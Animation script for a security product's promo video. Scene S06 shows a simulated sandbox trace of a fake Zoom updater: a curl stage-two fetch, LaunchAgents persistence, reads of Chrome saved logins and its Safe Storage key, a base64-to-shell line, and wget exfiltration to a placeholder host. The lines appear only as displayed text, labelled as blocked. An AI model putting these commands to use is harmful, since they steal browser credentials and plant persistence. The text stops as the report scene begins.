// Aegis product video: every scene on one paused GSAP timeline (M), positioned in absolute
// seconds so each beat lines up with the voiceover (timing.json). Anything that moves
// continuously (background, fly-through, shake) is a pure function of time in a "tick", so a
// frame rendered out of order looks the same as one rendered in order.
(async () => {
  const qs = new URLSearchParams(location.search);
  const RENDER = qs.has('render');
  const T = await (await fetch('timing.json')).json();
  const ICONS = await (await fetch('icons.json')).json();
  Object.assign(ICONS, {
    eye: ['M2.062 12.348a1 1 0 0 1 0-.696 10.75 10.75 0 0 1 19.876 0 1 1 0 0 1 0 .696 10.75 10.75 0 0 1-19.876 0', 'M12 9a3 3 0 1 0 0 6 3 3 0 0 0 0-6'],
    clock: ['M12 2a10 10 0 1 0 0 20 10 10 0 1 0 0-20', 'M12 6v6l4 2'],
  });
  gsap.registerPlugin(SplitText, DrawSVGPlugin, MotionPathPlugin, CustomEase);

  const $ = (s, r = document) => r.querySelector(s);
  const $$ = (s, r = document) => [...r.querySelectorAll(s)];
  const icon = (name, size = 24) =>
    `<svg class="ic" width="${size}" height="${size}" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">${(ICONS[name] || []).map((d) => `<path d="${d}"/>`).join('')}</svg>`;
  $$('[data-icon]').forEach((el) => {
    el.innerHTML = icon(el.dataset.icon, +(el.dataset.size || 24));
    if (!el.style.display) el.style.display = 'inline-flex';
  });

  await Promise.all([
    document.fonts.load('700 80px Sora'), document.fonts.load('600 80px Sora'), document.fonts.load('500 40px Sora'),
    document.fonts.load('500 20px Manrope'), document.fonts.load('700 20px Manrope'), document.fonts.load('800 20px Manrope'),
    document.fonts.load('400 20px "JetBrains Mono"'), document.fonts.load('700 20px "JetBrains Mono"'),
  ]);
  await document.fonts.ready;

  const rng = (seed) => () => {
    seed = (seed + 0x6d2b79f5) | 0;
    let t = Math.imul(seed ^ (seed >>> 15), 1 | seed);
    t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t;
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
  const clamp = (v, a, b) => Math.max(a, Math.min(b, v));
  // Position of an element in stage pixels, ignoring transforms.
  const pos = (el) => {
    let x = 0, y = 0, e = el;
    while (e && e.id !== 'stage') { x += e.offsetLeft; y += e.offsetTop; e = e.offsetParent; }
    return { x, y, w: el.offsetWidth, h: el.offsetHeight };
  };
  const split = (sel, type = 'words,chars', mask = 'chars') => SplitText.create(sel, { type, mask });

  const M = gsap.timeline({ paused: true, defaults: { ease: 'power3.out' } });
  const ticks = [];
  const tick = (fn) => ticks.push(fn);
  const B = { grid: 0.55, danger: 0, glow: 1, travel: 0 }; // background state
  const SH = { a: 0 }; // screen shake
  const shake = (t, amp = 1, dur = 0.5) => {
    M.fromTo(SH, { a: amp }, { a: 0, duration: dur, ease: 'power2.out', immediateRender: false }, t);
  };
  const flash = (t, peak = 0.35, dur = 0.5) => {
    M.fromTo('#flash', { opacity: peak }, { opacity: 0, duration: dur, ease: 'power2.out', immediateRender: false }, t);
  };

  // ---------- Scene visibility, entrances, exits, transitions ----------
  for (const s of T.scenes) {
    const el = $('#' + s.id);
    M.set(el, { visibility: 'visible' }, s.start);
    M.set(el, { visibility: 'hidden' }, s.end);
    M.fromTo(el, { scale: 1 }, { scale: 1.03, duration: s.end - s.start, ease: 'none', immediateRender: false }, s.start);
    if (s.start > 0) M.fromTo(el, { opacity: 0, filter: 'blur(16px)' }, { opacity: 1, filter: 'blur(0px)', duration: 0.6, ease: 'power2.out' }, s.start);
    if (s.end < T.duration) M.to(el, { opacity: 0, filter: 'blur(14px)', duration: 0.45, ease: 'power2.in' }, s.end - 0.45);
  }
  gsap.set('#sweep', { x: 0 });
  for (const tr of T.transitions) {
    M.fromTo('#sweep', { x: 0 }, { x: 3700, duration: 0.9, ease: 'power2.inOut', immediateRender: false }, tr - 0.45);
  }
  const bgTo = (vars, t, dur = 1) => M.to(B, { ...vars, duration: dur, ease: 'sine.inOut' }, t);
  M.to(B, { travel: 101 * 0.5, duration: 101, ease: 'none' }, 0);
  bgTo({ grid: 0.22 }, 5.6); bgTo({ grid: 0.55 }, 15.6); bgTo({ grid: 0.12 }, 23.6); bgTo({ grid: 0.3 }, 36.6);
  bgTo({ grid: 0.08 }, 47.6); bgTo({ grid: 0.28 }, 69.6); bgTo({ grid: 0.45 }, 87.6); bgTo({ grid: 0.6 }, 93.6);
  bgTo({ danger: 0.7 }, 11.8, 0.3); bgTo({ danger: 0 }, 15.4, 0.8);
  bgTo({ danger: 0.35 }, 56.8, 0.3); bgTo({ danger: 0 }, 59.0, 0.6);
  bgTo({ danger: 0.5 }, 60.35, 0.3); bgTo({ danger: 0 }, 69.4, 0.8);

  // ---------- S01 · Every click ----------
  {
    const items = [
      ['accounts.google.com', 'link'], ['invoice.pdf.exe', 'file-text'], ['paypa1.com/login', 'link'], ['zoom-update.sh', 'file-text'],
      ['bit.ly/3xT9aQ', 'link'], ['drivers.zip', 'box'], ['secure-doc-share.sbs/view', 'link'], ['q3-report.pdf', 'file-text'],
      ['rnicrosoft.com/support', 'link'], ['setup.pkg', 'box'], ['login-northwlnd-io.sbs/sso', 'link'], ['resume.docx', 'file-text'],
      ['github.com/chalk-ai/examples', 'link'], ['install.command', 'file-text'], ['track-parcel.top/r/88', 'link'], ['keys.p12', 'key'],
      ['docs.example.com/d/1Fz', 'link'], ['patch.dmg', 'box'], ['wallpaper.png', 'file-text'],
    ];
    const tunnel = $('#tunnel');
    const r = rng(11);
    const flies = [];
    for (let i = 0; i < 40; i++) {
      const [text, ic] = items[i % items.length];
      const d = document.createElement('div');
      d.className = 'fly';
      d.innerHTML = icon(ic, 22) + text;
      tunnel.appendChild(d);
      let X = (r() * 2 - 1) * 1700, Y = (r() * 2 - 1) * 1000;
      if (Math.abs(X) < 620 && Math.abs(Y) < 330) Y = Y < 0 ? Y - 360 : Y + 360;
      flies.push({ d, X, Y, p: i / 40 + r() * 0.02 });
    }
    const F = { travel: 0 };
    M.to(F, { travel: 0.95, duration: 5.3, ease: 'none' }, 0);
    M.to(F, { travel: 1.9, duration: 0.75, ease: 'power3.in' }, 5.3);
    tick((t) => {
      if (t > 6.2) return;
      for (const f of flies) {
        const fr = (f.p + F.travel) % 1;
        const zz = 2800 - fr * 2650;
        const s = 760 / zz;
        const o = clamp(fr / 0.22, 0, 1) * clamp((3.4 - s) / 1.4, 0, 1);
        const blur = s > 1.5 ? (s - 1.5) * 2.2 : 0;
        f.d.style.transform = `translate3d(${960 + f.X * s}px, ${540 + f.Y * s}px, 0) translate(-50%, -50%) scale(${s})`;
        f.d.style.opacity = o.toFixed(3);
        f.d.style.filter = blur ? `blur(${blur.toFixed(1)}px)` : 'none';
        f.d.style.zIndex = Math.round(fr * 100);
      }
    });
    const l1 = split('#s01-l1'), l2 = split('#s01-l2');
    M.from('#s01-eb', { opacity: 0, letterSpacing: '0.7em', duration: 1.2, ease: 'expo.out' }, 0.7);
    M.from(l1.chars, { yPercent: 120, duration: 0.9, ease: 'expo.out', stagger: 0.02 }, 1.6);
    M.from(l2.chars, { yPercent: 120, duration: 0.9, ease: 'expo.out', stagger: 0.02 }, 3.35);
    M.fromTo('#s01-center', { y: 52 }, { y: 0, duration: 0.9, ease: 'power3.inOut' }, 3.2);
    M.to('#s01-center', { scale: 1.3, opacity: 0, filter: 'blur(12px)', duration: 0.6, ease: 'power2.in' }, 5.4);
  }

  // ---------- S02 · Threat detected ----------
  {
    const dlg = $('#dlg');
    // Shards: triangles fanned out from the impact point, cloned before any tween touches the dialog.
    const pts = [0, 1, 2, 3];
    const r = rng(5);
    for (let i = 0; i < 14; i++) pts.push(r() * 4);
    pts.sort((a, b) => a - b);
    const per = (p) => {
      const e = Math.floor(p) % 4, f = p - Math.floor(p);
      return [[f * 100, 0], [100, f * 100], [100 - f * 100, 100], [0, 100 - f * 100]][e];
    };
    const ix = 52, iy = 46;
    const shards = [];
    for (let i = 0; i < pts.length; i++) {
      const a = per(pts[i]), b = per(pts[(i + 1) % pts.length] + (i === pts.length - 1 ? 4 : 0));
      const c = dlg.cloneNode(true);
      c.removeAttribute('id');
      c.classList.add('shard');
      c.style.clipPath = `polygon(${ix}% ${iy}%, ${a[0]}% ${a[1]}%, ${b[0]}% ${b[1]}%)`;
      dlg.parentNode.appendChild(c);
      const mx = (a[0] + b[0]) / 2 - ix, my = (a[1] + b[1]) / 2 - iy;
      const len = Math.hypot(mx, my) || 1;
      shards.push({ c, dx: (mx / len) * (500 + r() * 700), dy: (my / len) * (400 + r() * 500) + 200, rot: (r() * 2 - 1) * 70 });
    }
    gsap.set(shards.map((s) => s.c), { opacity: 0, y: -90 });

    const h = split('#s02-h', 'words', 'words');
    M.from('#s02-eb', { opacity: 0, x: -20, duration: 0.6 }, 6.35);
    M.from(h.words, { yPercent: 110, duration: 0.8, ease: 'expo.out', stagger: 0.045 }, 6.55);
    M.from('#laptop', { opacity: 0, y: 60, duration: 0.9, ease: 'expo.out' }, 6.3);
    gsap.set('#file-drop', { x: 1135, y: 110, opacity: 0, rotation: -10 });
    M.to('#file-drop', { opacity: 1, duration: 0.3 }, 6.6);
    M.to('#file-drop', { x: 1262, y: 455, rotation: 0, duration: 0.95, ease: 'power2.in' }, 6.7);
    M.to('#file-drop', { scaleY: 0.82, scaleX: 1.08, duration: 0.09, yoyo: true, repeat: 1, ease: 'power1.out' }, 7.65);
    M.fromTo('#land-ring', { scale: 1, opacity: 0.9 }, { scale: 22, opacity: 0, duration: 0.9, ease: 'expo.out' }, 7.65);
    gsap.set('#scan-late', { x: 1950, y: 430 });
    M.to('#scan-late', { x: 1590, duration: 1.2, ease: 'expo.out' }, 8.7);
    gsap.set('#late-note', { x: 1250, y: 805, opacity: 0 });
    M.to('#late-note', { opacity: 1, y: 790, duration: 0.6 }, 9.2);
    M.to('#s02-left, #laptop, #file-drop, #scan-late, #late-note', { opacity: 0.12, filter: 'blur(6px)', duration: 0.7, ease: 'power2.inOut' }, 10.25);

    M.fromTo(dlg, { scale: 2.4, opacity: 0, rotation: -4 }, { scale: 1, opacity: 1, rotation: 0, duration: 0.33, ease: 'power4.in' }, 11.52);
    shake(11.85, 1.4, 0.6);
    flash(11.85, 0.18, 0.4);
    M.to(dlg, { y: -90, duration: 0.7, ease: 'power3.inOut' }, 12.85);
    const n1 = split('#s02-n1', 'words', 'words');
    M.from(n1.words, { yPercent: 110, duration: 0.7, ease: 'expo.out', stagger: 0.06 }, 13.05);
    M.from('#s02-n2', { scale: 1.8, opacity: 0, filter: 'blur(10px)', duration: 0.45, ease: 'expo.out' }, 14.5);
    M.set(dlg, { opacity: 0 }, 15.25);
    M.set(shards.map((s) => s.c), { opacity: 1 }, 15.25);
    for (const s of shards) {
      M.to(s.c, { x: s.dx, y: -90 + s.dy, rotation: s.rot, opacity: 0, duration: 1.1, ease: 'power2.out' }, 15.25);
    }
    shake(15.25, 1.0, 0.4);
    flash(15.25, 0.3, 0.5);
    M.to('#s02-not', { opacity: 0, y: 40, filter: 'blur(8px)', duration: 0.5, ease: 'power2.in' }, 15.35);
  }

  // ---------- Logo lockup (S03, S11) ----------
  const SHIELD = 'M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z';
  function lockup(p, { draw, fill, word, centerY }) {
    const svg = $(`#${p}-shield`);
    svg.innerHTML = `
      <defs>
        <linearGradient id="${p}-g" x1="0" y1="0" x2="0" y2="1"><stop offset="0" stop-color="#8bf0ff"/><stop offset="1" stop-color="#1a74c4"/></linearGradient>
        <filter id="${p}-f" x="-50%" y="-50%" width="200%" height="200%"><feGaussianBlur stdDeviation="0.9"/></filter>
      </defs>
      <path class="glow" d="${SHIELD}" stroke="#50e6ff" stroke-width="2.4" filter="url(#${p}-f)" opacity="0"/>
      <path class="fill" d="${SHIELD}" fill="url(#${p}-g)" opacity="0"/>
      <path class="stroke" d="${SHIELD}" stroke="#8bf0ff" stroke-width="1.1" stroke-linecap="round" stroke-linejoin="round"/>
      <path class="check" d="m9 12 2 2 4-4" stroke="#8bf0ff" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>`;
    const word$ = $(`#${p}-word`);
    const shift = (word$.offsetWidth + 40) / 2;
    const ch = SplitText.create(word$, { type: 'chars', charsClass: 'wm-ch' });
    gsap.set(svg, { x: shift, scale: 1.45, transformOrigin: '50% 50%' });
    M.fromTo($('.stroke', svg), { drawSVG: '0%' }, { drawSVG: '100%', duration: fill - draw - 0.15, ease: 'power2.inOut' }, draw);
    M.fromTo($('.check', svg), { drawSVG: '0%' }, { drawSVG: '100%', duration: 0.3, ease: 'power2.out' }, fill - 0.35);
    M.to($('.glow', svg), { opacity: 0.9, duration: 0.4 }, draw + 0.2);
    M.to($('.fill', svg), { opacity: 1, duration: 0.25, ease: 'power2.out' }, fill);
    M.to($('.check', svg), { stroke: '#031a2b', duration: 0.2 }, fill);
    M.fromTo(svg, { scale: 1.45 }, { scale: 1.6, duration: 0.12, yoyo: true, repeat: 1, ease: 'power2.out', immediateRender: false }, fill);
    M.to(svg, { x: 0, scale: 1, duration: 0.9, ease: 'expo.inOut' }, word - 0.25);
    M.from(ch.chars, { yPercent: 70, opacity: 0, rotationX: -90, transformOrigin: '50% 100%', duration: 0.8, ease: 'expo.out', stagger: 0.06 }, word);
    // Shockwave rings and sparks from the shield's centre at the moment it fills.
    $$(`#${p} .ring`).forEach((ring, i) => {
      gsap.set(ring, { width: 260, height: 260, marginLeft: -130, marginTop: -130, top: centerY, opacity: 0 });
      M.fromTo(ring, { scale: 0.4, opacity: 0.9 }, { scale: 4 + i, opacity: 0, duration: 1.4 + i * 0.2, ease: 'expo.out', immediateRender: false }, fill + i * 0.1);
    });
    const sparks = $(`#${p}-sparks`);
    if (sparks) {
      const r = rng(3);
      for (let i = 0; i < 34; i++) {
        const s = document.createElement('div');
        s.className = 'spark';
        sparks.appendChild(s);
        const a = (i / 34) * Math.PI * 2 + r() * 0.2, d = 260 + r() * 420;
        gsap.set(s, { top: centerY, x: 0, opacity: 0 });
        M.fromTo(s, { x: 0, y: 0, opacity: 1, scale: 1 + r() * 1.5 },
          { x: Math.cos(a) * d, y: Math.sin(a) * d, opacity: 0, scale: 0.3, duration: 1.1 + r() * 0.6, ease: 'expo.out', immediateRender: false }, fill);
      }
    }
    const rays = $(`#${p}-rays`);
    gsap.set(rays, { opacity: 0, top: centerY, marginTop: -1100 });
    M.to(rays, { opacity: 1, duration: 1.2, ease: 'power2.out' }, fill);
    tick((t) => gsap.set(rays, { rotation: t * 5 }));
    shake(fill, 0.8, 0.45);
    flash(fill, 0.22, 0.6);
  }

  // ---------- S03 · Meet Aegis ----------
  {
    lockup('s03', { draw: 16.15, fill: 17.35, word: 17.6, centerY: 395 });
    const t1 = split('#s03-t1', 'words', 'words'), t2 = split('#s03-t2', 'words', 'words');
    M.from(t1.words, { yPercent: 110, opacity: 0, duration: 0.7, ease: 'expo.out', stagger: 0.05 }, 18.7);
    M.from(t2.words, { yPercent: 110, opacity: 0, duration: 0.7, ease: 'expo.out', stagger: 0.05 }, 21.6);
  }

  // ---------- S04 · Links ----------
  {
    M.fromTo('#browser', { x: -140, opacity: 0, rotationY: 16, transformPerspective: 1800 }, { x: 0, opacity: 1, rotationY: 0, duration: 1.2, ease: 'expo.out' }, 24.05);
    const rows = $$('#checks .check-row');
    M.from('#checks-h', { opacity: 0, x: 30, duration: 0.6 }, 24.4);
    M.fromTo(rows, { opacity: 0, x: 60 }, { opacity: 0.42, x: 0, duration: 0.8, ease: 'expo.out', stagger: 0.09 }, 24.5);
    // Scan line sweeps the page; links get their borders as it passes.
    M.fromTo('#scanline', { opacity: 0, y: 0 }, { opacity: 1, duration: 0.15 }, 25.1);
    M.to('#scanline', { y: 720, duration: 1.5, ease: 'power1.inOut' }, 25.1);
    M.to('#scanline', { opacity: 0, duration: 0.25 }, 26.45);
    const flagAt = [['#lk-phish .flag', 25.55], ['#lk-look .flag', 25.78], ['#lk-short .flag', 26.0]];
    for (const [sel, t] of flagAt) M.fromTo(sel, { opacity: 0, scale: 1.35 }, { opacity: 1, scale: 1, duration: 0.35, ease: 'back.out(2.2)' }, t);
    M.fromTo('#clean-ok', { opacity: 0, scale: 0.4 }, { opacity: 1, scale: 1, duration: 0.35, ease: 'back.out(2.5)' }, 26.2);
    M.fromTo('#ext-icon', { scale: 1 }, { scale: 1.35, duration: 0.18, yoyo: true, repeat: 3, ease: 'power1.inOut', immediateRender: false }, 25.5);
    // Cursor glides to the phishing link and clicks it.
    const a = pos($('#lk-phish'));
    const tx = a.x + a.w * 0.55, ty = a.y + a.h * 0.55;
    gsap.set('#cursor', { x: 980, y: 980, opacity: 0 });
    M.to('#cursor', { opacity: 1, duration: 0.25 }, 26.3);
    M.to('#cursor', { x: tx, y: ty, duration: 1.15, ease: 'power3.inOut' }, 26.4);
    M.to('#cursor', { scale: 0.82, duration: 0.08, yoyo: true, repeat: 1 }, 27.65);
    gsap.set('#click-ring', { x: tx, y: ty });
    M.fromTo('#click-ring', { scale: 0.2, opacity: 1 }, { scale: 1.8, opacity: 0, duration: 0.6, ease: 'expo.out', immediateRender: false }, 27.7);
    M.to('#cursor', { opacity: 0, duration: 0.3 }, 28.2);
    M.to('#scrim', { opacity: 1, duration: 0.35, ease: 'power2.out' }, 27.78);
    M.fromTo('#guard', { opacity: 0, scale: 0.8, y: 40 }, { opacity: 1, scale: 1, y: 0, duration: 0.6, ease: 'back.out(1.7)' }, 27.85);
    M.fromTo('#goes', { clipPath: 'inset(0 100% 0 0)' }, { clipPath: 'inset(0 0% 0 0)', duration: 0.7, ease: 'steps(26)' }, 28.25);
    M.from('#g-chips .chip', { opacity: 0, y: 14, duration: 0.45, stagger: 0.1, ease: 'back.out(2)' }, 28.55);
    M.from('#guard .btns', { opacity: 0, y: 10, duration: 0.4 }, 28.9);
    M.from('#g-foot', { opacity: 0, duration: 0.4 }, 29.05);
    // Each check lights up as the voiceover names it.
    const lightAt = [28.72, 30.12, 31.64, 32.95];
    rows.forEach((row, i) => {
      const t = lightAt[i];
      M.to(row, { opacity: 1, duration: 0.25 }, t);
      M.fromTo($('.lit', row), { opacity: 0 }, { opacity: 1, duration: 0.35 }, t);
      M.to($('.ico', row), { color: '#50e6ff', backgroundColor: '#0b3b52', boxShadow: '0 0 24px rgba(80,230,255,.35)', duration: 0.35 }, t);
      M.fromTo($('.tick', row), { scale: 0, opacity: 0 }, { scale: 1, opacity: 1, duration: 0.5, ease: 'back.out(3)' }, t + 0.1);
      if (i > 0) M.to($('.lit', rows[i - 1]), { opacity: 0.25, duration: 0.4 }, t);
    });
    M.fromTo('#chip-look', { scale: 1 }, { scale: 1.12, duration: 0.2, yoyo: true, repeat: 1, ease: 'power1.inOut', immediateRender: false }, 28.85);
    M.fromTo('#said', { boxShadow: '0 0 0 0 rgba(80,230,255,0)' }, { boxShadow: '0 0 0 3px rgba(80,230,255,.9), 0 0 40px rgba(80,230,255,.4)', duration: 0.25, yoyo: true, repeat: 1, immediateRender: false }, 30.2);
    M.fromTo('#chip-new', { scale: 1 }, { scale: 1.12, duration: 0.2, yoyo: true, repeat: 1, ease: 'power1.inOut', immediateRender: false }, 31.75);
    M.fromTo('#stat06', { opacity: 0, y: 40 }, { opacity: 1, y: 0, duration: 0.7, ease: 'expo.out' }, 34.25);
    const N6 = { v: 0 };
    M.to(N6, { v: 0.6, duration: 0.8, ease: 'power2.out', onUpdate: () => ($('#n06').textContent = N6.v.toFixed(1) + ' s') }, 34.3);
    M.to('#g-foot', { color: '#50e6ff', duration: 0.3 }, 34.4);
  }

  // ---------- S05 · Downloads ----------
  {
    M.from('#s05-a', { opacity: 0, y: 30, filter: 'blur(10px)', duration: 0.7 }, 37.55);
    M.from('#s05-b', { opacity: 0, y: 30, filter: 'blur(10px)', duration: 0.7 }, 39.3);
    M.from('#mac', { opacity: 0, x: -80, duration: 0.9, ease: 'expo.out' }, 37.1);
    M.from('#dl1', { opacity: 0, y: 20, duration: 0.5 }, 37.25);
    M.fromTo('#dl1-bar', { scaleX: 0 }, { scaleX: 0.62, duration: 1.0, ease: 'none' }, 37.35);
    M.fromTo('#dl1 .corner', { scale: 2.4, opacity: 0 }, { scale: 1, opacity: 1, duration: 0.35, ease: 'expo.out' }, 38.3);
    M.to('#dl1-bar', { backgroundColor: '#50e6ff', duration: 0.2 }, 38.35);
    M.to('#dl1', { borderColor: '#50e6ff', boxShadow: '0 0 40px rgba(80,230,255,.25)', duration: 0.3 }, 38.35);
    M.to('#dl1-sub', { color: '#50e6ff', duration: 0.2 }, 38.35);
    M.fromTo('#held-tag', { opacity: 0, y: 10 }, { opacity: 1, y: 0, duration: 0.5 }, 38.6);
    flash(38.35, 0.08, 0.3);
    M.from('#dl2', { opacity: 0, y: 20, duration: 0.5 }, 39.55);
    M.fromTo('#dl2-bar', { scaleX: 0 }, { scaleX: 1, duration: 0.65, ease: 'power1.in' }, 39.65);
    M.fromTo('#dl2-badge', { opacity: 0, scale: 0.5 }, { opacity: 1, scale: 1, duration: 0.45, ease: 'back.out(2.4)' }, 40.4);
    M.from('#dl2-note', { opacity: 0, x: -10, duration: 0.5 }, 40.6);
    M.from('#cube-label', { opacity: 0, y: 14, duration: 0.6 }, 41.0);
    M.from('#cube', { opacity: 0, scale: 0.7, y: 50, transformOrigin: '50% 50%', duration: 1.0, ease: 'expo.out' }, 40.7);
    M.fromTo('#fly-path', { drawSVG: '0%' }, { drawSVG: '100%', duration: 0.6, ease: 'power2.inOut' }, 40.9);
    M.to('#fly-path', { opacity: 0, duration: 0.5 }, 42.7);
    // The script leaves the Mac along the path into the sandbox, with a light trail.
    const d1 = pos($('#dl1'));
    const flyer = $('#flyer');
    const mp = { path: '#fly-path', align: '#fly-path', alignOrigin: [0.5, 0.5] };
    gsap.set(flyer, { opacity: 0 });
    M.set(flyer, { opacity: 1 }, 41.2);
    M.fromTo(flyer, { motionPath: { ...mp, start: 0, end: 0 } }, { motionPath: { ...mp, start: 0, end: 1 }, duration: 1.35, ease: 'power2.inOut', immediateRender: false }, 41.2);
    M.to(flyer, { scale: 0.3, opacity: 0, duration: 0.2, ease: 'power2.in' }, 42.4);
    $$('.ghost').forEach((g, i) => {
      gsap.set(g, { width: flyer.offsetWidth, height: flyer.offsetHeight, opacity: 0 });
      M.set(g, { opacity: 0.55 - i * 0.15 }, 41.2 + (i + 1) * 0.06);
      M.fromTo(g, { motionPath: { ...mp, start: 0, end: 0 } }, { motionPath: { ...mp, start: 0, end: 1 }, duration: 1.35, ease: 'power2.inOut', immediateRender: false }, 41.2 + (i + 1) * 0.06);
      M.to(g, { opacity: 0, duration: 0.15 }, 42.45 + i * 0.06);
    });
    M.to('#dl1', { opacity: 0.35, duration: 0.4 }, 41.25);
    M.to('#cube-core', { opacity: 1, duration: 0.2 }, 42.55);
    M.fromTo('#cube-core', { scale: 1.8, transformOrigin: '50% 50%' }, { scale: 1, duration: 0.6, ease: 'expo.out', immediateRender: false }, 42.55);
    shake(42.55, 0.5, 0.35);
    tick((t) => gsap.set('#cube', { y: Math.sin(t * 1.3) * 8 }));
    // The network is off from creation: a barrier, then six probes that never get out.
    M.fromTo('#barrier', { scale: 0.55, opacity: 0 }, { scale: 1, opacity: 1, duration: 0.9, ease: 'expo.out' }, 44.5);
    M.from('#nb-tag > .chip', { opacity: 0, y: 14, duration: 0.5 }, 44.7);
    const probes = $('#probes');
    const angles = [-160, -125, -90, -55, -20, 160];
    const names = ['python3 registry.npmjs.org', 'wget registry.npmjs.org', 'curl registry.npmjs.org', 'curl example.com', 'wget example.com', 'python3 example.com'];
    angles.forEach((deg, i) => {
      const t = 44.8 + i * 0.28;
      const rad = (deg * Math.PI) / 180;
      const line = document.createElement('div'); line.className = 'probe';
      const x = document.createElement('div'); x.className = 'probe-x'; x.innerHTML = icon('x', 34);
      const lab = document.createElement('div'); lab.className = 'probe-l'; lab.textContent = names[i];
      probes.append(line, x, lab);
      gsap.set(line, { rotation: deg, width: 0, opacity: 1 });
      gsap.set(x, { left: 310 + Math.cos(rad) * 258, top: 300 + Math.sin(rad) * 258 });
      const lx = 310 + Math.cos(rad) * 290, ly = 300 + Math.sin(rad) * 290;
      gsap.set(lab, { left: lx, top: ly, xPercent: Math.abs(Math.cos(rad)) < 0.3 ? -50 : Math.cos(rad) < 0 ? -100 : 0, yPercent: Math.abs(Math.cos(rad)) < 0.3 ? -100 : -50 });
      M.fromTo(line, { width: 0 }, { width: 256, duration: 0.24, ease: 'power2.in' }, t - 0.24);
      M.to(line, { opacity: 0, duration: 0.35 }, t + 0.05);
      M.fromTo(x, { opacity: 0, scale: 2 }, { opacity: 1, scale: 1, duration: 0.3, ease: 'back.out(3)' }, t);
      M.fromTo(lab, { opacity: 0 }, { opacity: 1, duration: 0.3 }, t + 0.05);
      M.fromTo('#barrier', { scale: 1 }, { scale: 1.03, duration: 0.08, yoyo: true, repeat: 1, immediateRender: false }, t);
    });
    M.from('#six', { opacity: 0, y: 10, duration: 0.5 }, 46.5);
  }

  // ---------- S06 · Watch it run ----------
  {
    M.from('#lv-top', { opacity: 0, y: -40, duration: 0.8, ease: 'expo.out' }, 48.05);
    M.from('#lv-left', { opacity: 0, x: -60, duration: 0.8, ease: 'expo.out' }, 48.2);
    M.from('#lv-right', { opacity: 0, x: 60, duration: 0.8, ease: 'expo.out' }, 48.3);
    M.from('#divider', { scaleY: 0, transformOrigin: '50% 0', duration: 0.9, ease: 'power2.inOut' }, 48.5);
    M.from('#divider-l', { opacity: 0, duration: 0.5 }, 49.0);
    const lines = [
      [48.6, 'cmd', '$ daytona create --network-block-all --ephemeral'],
      [49.4, 'com', '# sandbox c9de083a ready in 1.1 s · network off at creation'],
      [49.75, 'cmd', '$ upload zoom-update.sh → ~/sample/file'],
      [50.3, 'cmd', '$ sha256sum sample/file'],
      [50.75, 'out', 'cfd92c5a33ec5cabdfd35b13756c3cda572d0dad0880c52450d8643f7e629053'],
      [51.0, 'com', '# matches the download'],
      [51.5, 'cmd', '$ probe example.com, registry.npmjs.org with curl, wget and python3'],
      [52.3, 'blk', '× blocked  all 6 attempts blocked: no network'],
      [52.8, 'com', '# sh -x zoom-update.sh  (limit 30 s, scratch home, empty environment)'],
      [53.3, 'trace', '+ echo Installing Zoom update 6.4.1...'],
      [53.7, 'blk', '× blocked  curl -fsSL https://updates.zoom-support.invalid/stage2.sh'],
      [54.2, 'trace', '+ mkdir -p /tmp/aegis-run/home/Library/LaunchAgents'],
      [54.6, 'trace', '+ cat > LaunchAgents/us.zoom.updater.plist'],
      [55.0, 'trace', '+ ls ~/Library/Application Support/Google/Chrome/Default/Login Data'],
      [55.4, 'trace', '+ security find-generic-password -w -s "Chrome Safe Storage"'],
      [55.8, 'trace', '+ echo ZWNobyBhZWdpcy10ZXN0LXN0YWdl | base64 -d | sh'],
      [56.3, 'blk', '× blocked  wget --post-data host=… https://collect.zoom-support.invalid/upload'],
    ];
    const term = $('#term');
    const blk = [];
    for (const [t, kind, text] of lines) {
      const ln = document.createElement('div');
      ln.className = 'ln c-' + kind;
      ln.textContent = text;
      term.appendChild(ln);
      if (kind === 'blk') blk.push(ln);
      if (kind === 'cmd') {
        M.set(ln, { opacity: 1 }, t);
        M.fromTo(ln, { clipPath: 'inset(0 100% 0 0)' }, { clipPath: 'inset(0 0% 0 0)', duration: Math.min(0.7, text.length * 0.012), ease: `steps(${text.length})` }, t);
      } else {
        M.fromTo(ln, { opacity: 0, x: -8 }, { opacity: 1, x: 0, duration: 0.18, ease: 'power2.out' }, t);
      }
      if (kind === 'blk') M.fromTo(ln, { backgroundColor: 'rgba(255,107,128,.35)' }, { backgroundColor: 'rgba(255,107,128,0)', duration: 0.8, immediateRender: false }, t);
    }
    // Droid's tool calls on the Mac, each crossing the read-only divider into the sandbox.
    const tools = $$('#tools .tool');
    const toolAt = [50.2, 51.45, 53.4, 55.0];
    tools.forEach((tool, i) => {
      const t = toolAt[i];
      M.from(tool, { opacity: 0, y: 24, duration: 0.5, ease: 'expo.out' }, t);
      M.fromTo(tool, { borderColor: '#50e6ff', boxShadow: '0 0 30px rgba(80,230,255,.3)' }, { borderColor: '#164463', boxShadow: '0 0 0 rgba(0,0,0,0)', duration: 1.2, immediateRender: false }, t + 0.2);
      const p = $('#p' + (i + 1));
      const tp = pos(tool);
      const y = tp.y + tp.h / 2;
      gsap.set(p, { left: tp.x + tp.w - 20, top: y, opacity: 0 });
      M.set(p, { opacity: 1 }, t + 0.25);
      M.to(p, { left: 905, duration: 0.45, ease: 'power2.in' }, t + 0.25);
      M.to(p, { opacity: 0, scale: 3, duration: 0.25 }, t + 0.7);
      M.fromTo('#term', { borderColor: '#50e6ff' }, { borderColor: '#164463', duration: 0.6, immediateRender: false }, t + 0.7);
    });
    tick((t) => {
      if (t < 48 || t > 59.6) return;
      $('#lv-clock').textContent = '0:' + String(41 + Math.floor(t - 48)).padStart(2, '0');
      gsap.set('#spinner', { rotation: t * 400, transformOrigin: '50% 50%' });
    });
    M.to(blk, { backgroundColor: 'rgba(255,107,128,.32)', duration: 0.14, yoyo: true, repeat: 5, ease: 'none' }, 56.85);
    M.fromTo('#home-fails', { opacity: 0, scale: 0.6, y: 20 }, { opacity: 1, scale: 1, y: 0, duration: 0.55, ease: 'back.out(2)' }, 56.9);
    shake(56.9, 0.4, 0.3);
  }

  // ---------- S07 · The report ----------
  {
    M.from('#rp-top', { opacity: 0, scale: 0.97, duration: 0.6, ease: 'expo.out' }, 59.6);
